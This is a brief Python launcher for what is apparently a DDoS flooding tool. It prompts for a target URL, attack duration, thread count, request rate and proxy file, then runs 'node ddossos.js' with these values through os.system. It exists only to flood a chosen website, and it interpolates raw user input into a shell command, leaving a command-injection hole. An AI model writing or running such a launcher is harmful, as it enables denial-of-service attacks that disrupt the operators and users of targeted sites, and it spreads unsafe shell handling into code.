import os
import json


url = input("\nURL: ")
time = input("Time: ") 
threads = input("Threads: ")
rps = input("rps: ")
proxy = input("proxy-file: ")
print("\n")

if url.strip() and threads.strip() and rps.strip() and time.strip():
    flood = os.path.join("ddossos.js")
    os.system(f'node {flood} {url} {time} {threads} {rps} {proxy}')
else:
    print("WRONG INPUT")
